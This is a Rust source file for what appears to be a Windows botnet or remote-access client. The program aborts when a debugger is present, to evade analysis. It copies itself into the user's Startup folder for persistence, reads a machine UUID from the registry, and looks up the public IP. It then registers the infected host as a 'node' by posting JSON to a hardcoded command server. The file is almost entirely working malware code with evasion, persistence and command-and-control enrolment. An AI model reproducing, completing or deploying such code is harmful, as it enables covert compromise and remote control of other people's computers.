mod node;

use node::Node;
use regex::Regex;
use reqwest::Client;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::{env, fs, io, process, thread, time};
use windows::{
    Win32::Foundation::*, Win32::System::Diagnostics::*, Win32::UI::WindowsAndMessaging::*,
};
use winreg::enums::*;
use winreg::RegKey;

#[tokio::main]
async fn main() {
    // check if debugger present
    unsafe {
        match Debug::IsDebuggerPresent().as_bool() {
            true => {
                println!("Debugger detected, exiting...");
                process::abort();
            }
            false => {}
        }
    }

    // check mouse position, if not moved abort
    let mut cursor: POINT = POINT { x: 0i32, y: 0i32 };

    // copy self to startup folder
    let mut path = fs::canonicalize(
        "C:\\Users\\".to_string()
            + &env::var("USERNAME").unwrap()
            + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
    )
    .unwrap();

    let exe_path = env::current_exe().unwrap();
    let exe = &exe_path.file_name().unwrap();

    path.push(exe);

    match fs::copy(env::current_exe().unwrap(), &path) {
        Ok(_) => {
            println!("Copied to {}", path.to_str().unwrap());
            register().await;
        }
        Err(e) => println!("Error: {}", e),
    }

    let _uuid: String = get_uuid();

    io::stdin().read_line(&mut String::new()).unwrap();
}

async fn register() -> Node {
    let client: Client = reqwest::Client::new();

    /* Register to server */
    let mut mouse_pos: Vec<i32> = Vec::new();

    for _ in 0..1024 {
        let mut point: POINT = POINT { x: 0i32, y: 0i32 };
        unsafe { GetCursorPos(&mut point as *mut POINT) };
        mouse_pos.push(point.x);
        mouse_pos.push(point.y);
    }

    let mut mouse_pos_str: String = String::new();

    // convert vec to concatenated string
    for i in mouse_pos {
        mouse_pos_str += &i.to_string();
    }

    let random_input: String = calculate_hash(&mouse_pos_str).to_string();

    let uuid: String = get_uuid();

    let ipv4: String = client
        .get("https://icanhazip.com/")
        .send()
        .await
        .unwrap()
        .text()
        .await
        .unwrap();

    // remove \n from ipv4
    let ipv4: String = ipv4.trim().to_string();

    let mut node: Node = Node::new(uuid, random_input, ipv4);
    node.update_realtime();

    let json: String = serde_json::to_string(&node).unwrap();

    let register_resp = client
        .post("http://172.20.0.3:8000/api/node/")
        .body(json)
        .header("Content-Type", "application/json")
        .send()
        .await
        .unwrap();

    if register_resp.status().is_success() {
        println!("Registered to server");
    } else {
        println!("Error: {}", register_resp.status());
    }

    return node;
}

fn calculate_hash<T: Hash>(t: &T) -> u64 {
    /*
    may need to hash differently,
    because function only returns u64,
    so someone could theoretically bruteforce the random_input
    */

    let mut s: DefaultHasher = DefaultHasher::new();
    t.hash(&mut s);
    s.finish()
}

fn get_uuid() -> String {
    let regex: Regex = Regex::new(r"\{|\}|").unwrap();

    let hklm: RegKey = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key: RegKey = hklm.open_subkey("SYSTEM\\HardwareConfig\\").unwrap();
    let raw_uuid: String = key.get_value("LastConfig").unwrap();

    let uuid: String = regex.replace_all(&raw_uuid, "").to_string();

    return uuid;
}
